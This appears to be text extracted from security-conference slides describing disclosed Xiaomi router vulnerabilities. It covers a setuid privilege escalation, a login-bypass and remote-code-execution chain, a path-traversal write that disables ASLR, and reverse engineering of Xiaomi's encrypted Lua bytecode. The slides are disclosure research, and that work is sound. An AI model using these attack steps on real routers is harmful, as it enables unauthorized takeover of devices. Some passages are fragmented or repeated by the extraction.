Compile time options: IPv6 GNU-getopt no-DBus no-i18n no-IDN DHCP no-DHCPv6 no-Lua
TFTP no-conntrack ipset no-auth no-DN
SSEC no-ID loop-detect no-inotify dumpfile
root@XiaoQiang:/tmp# ls -l test*
-rwxrwxrwx
1 1000
1000
78 Jul
7 18:43 test.des
-rwxrwxrwx
1 1000
1000
1104 Jul
7 18:43 test.mbu
root@XiaoQiang:/tmp# cat /etc/passwd
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
root@XiaoQiang:/tmp#
uid = 1000, who is it?
root@XiaoQiang:/tmp# ls -l test*
-rwsrwxrwx
1 root 
root
78 Jul
7 18:43 test.des
-rwsrwxrwx
1 root 
root
1104 Jul
7 18:43 test.mbu
It’s the attackers’ uid on his own machine and the file attribute is also 
reserved. We don’t know the exact reason now, but we can leverage it.
It’s a classical local privilege escalation primitive
root@XiaoQiang:/tmp# mount
……
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)
……
ubi1_0 on /etc type ubifs (rw,relatime)
……
root@XiaoQiang:/tmp#
root@XiaoQiang:/tmp# mount
……
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,noatime)
……
ubi1_0 on /etc type ubifs (rw,relatime)
……
root@XiaoQiang:/tmp# ls -l /tmp/spool/cron/
lrwxrwxrwx 1 root root 13 Aug 20 17:32 crontabs -> /etc/crontabs
Escalation using suid shell script has 
been a history
There is a file size limitation. So we created an 
suid backdoor using assembly
Local Privilege Escalation!
However, all processes are running as root, so this certainly doesn’t meet the security bar. 
But MiSRC paid an extra bounty for this issue:) thanks!
So we got our first full chain exploit by guessing and twisting!
Login bypass(CVE-2020-11959):
⚫ Get stok from /tmp/messages
Remote command execute(CVE-2020-11960):
⚫ Upload a malicious archive
⚫ Restart dnsmasq, enable/disable ipv6, for example
⚫ Trigger by tftp
⚫ We have got unauthorized RCE without reversing and debugging
⚫ We can’t ignore the big attack surface: encrypted luac files
The lua in xiaomi router has a custom format and is encrypted, whose magic number is
\x1bFate/Z\x1b
The lua in xiaomi router has a custom format and is encrypted, whose magic number is
\x1bFate/Z\x1b
The first struct of a luac file is global header. which 
contains magic number, version and some global data 
defination.
magic number
version
endian
size of int
size of size_t
size of instruction
size of lua_number(double)
float flag support
Global Header
The remain part of a luac is a recursive struct 
called Proto or Function. 
This function struct contain all the info of a lua
function.
source
Proto header
Code
Constants
Sub Functions
Debug info
sub funciton1
sub funciton2
...
Function
1. Magic Number and header
Xiaomi: “\x1BFate/Z\x1B”
Original: “\x1BLua”
2. Encrypt strings in luac
str[i] ^= 13 * size + 55
3. The order of struct field is different
//Original Luac
struct {
String source;
uint32 linedefined;
uint32 lastlinedefined;
uchar nups /* number of upvalues */;
uchar numparams;
uchar is_vararg;
uchar maxstacksize;
} ProtoHeader;
// Xiaomi Luac
struct {
uchar numparams;
String source;
uchar nups /* number of upvalues */;
uint32 linedefined;
uchar is_vararg;
uint32 lastlinedefined;
uchar maxstacksize;
} ProtoHeader;
4. Data type shift and a new datatype
enum {
LUA_TNIL = 0,
LUA_TBOOLEAN = 1,
LUA_TLIGHTUSERDATA = 2,
LUA_TNUMBER = 3,
LUA_TSTRING = 4,
LUA_TTABLE = 5,
LUA_TFUNCTION = 6,
LUA_TUSERDATA = 7,
LUA_TTHREAD = 8,
}LUA_DATATYPE;
original Luac
4. Data type shift and a new datatype
enum {
LUA_TNIL = 3,
LUA_TBOOLEAN = 4,
LUA_TLIGHTUSERDATA = 5,
LUA_TNUMBER = 6,
LUA_TSTRING = 7,
LUA_TTABLE = 8,
LUA_TFUNCTION = 9,
LUA_TUSERDATA = 10,
LUA_TTHREAD = 11,
LUA_XIAOMI = 12,
}LUA_DATATYPE;
Xiaomi Luac
Lua5.1 only have float data. But Xiaomi add a new data type 
which stores signed integer data.
Xiaomi
Original
5 . Shuffle opcode id
Original 0x14: OP_LEN
Xiaomi 0x00: OP_LEN
6.  Add a new instruction
Luac Instruction Mode iABC
We user python to do this convert and this is our code
https://github.com/zh-explorer/mi_lua
Xiaomi
Luac
Convert
Layer
Luac
metadata
Normal 
Luac
we use python package Construct to do this. Just define a metadata and the convert layer 
then Construct will encode/decode automatically.
Xiaomi
Luac
Convert
Layer
Luac
metadata
Normal 
Luac
All problems in computer science can be solved by another level of indirection
-David Wheeler
Protos = Struct(
"sizep" / Int32ul,
"proto" / Array(this.sizep, LazyBound(lambda: Proto))
)
Proto = Struct(
"header" / ProtoHead,
"code" / Code,
"constants" / Constants,
"protos" / Protos,
"lineinfo" / LineInfo,
"loc_vars" / LocVars,
"values" / UpValues,
)
Luac = Struct(
"global_head" / GlobalHead,
"top_proto" / Proto
)
Lua metadata defination in Construct
class StrAdapter(Adapter):
def __init__(self, key, subcon):
assert key  /tmp/miwifi-scan/../../../../proc/sys/kernel/randomize_va_space
Memory bug to ROP like a pro:
echo 1 > /tmp/miwifi-scan/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa…...
⚫
AIoT
AX3600
⚫
AX1800
⚫ Redmi
AX6
⚫ Redmi
AX5
⚫
AC2100
…
Almost all
⚫ Unexperienced attackers/developers always ignore logical 
issues because the program runs well
⚫ There has been mature methods for hunting memory bugs like 
fuzzing. But because of the diversity of logical bugs, there are 
no mature public tools
⚫ Researchers should pay attention to the side effect of every 
step, and broaden minds
⚫ It’s both an opportunity and a challenge
⚫ Those who have did search on Xiaomi routers and shared 
their experience
⚫ Colleagues
⚫ We would like to thank MiSRC for their professional support 
and quick response, especially Pa0er for her kindly help.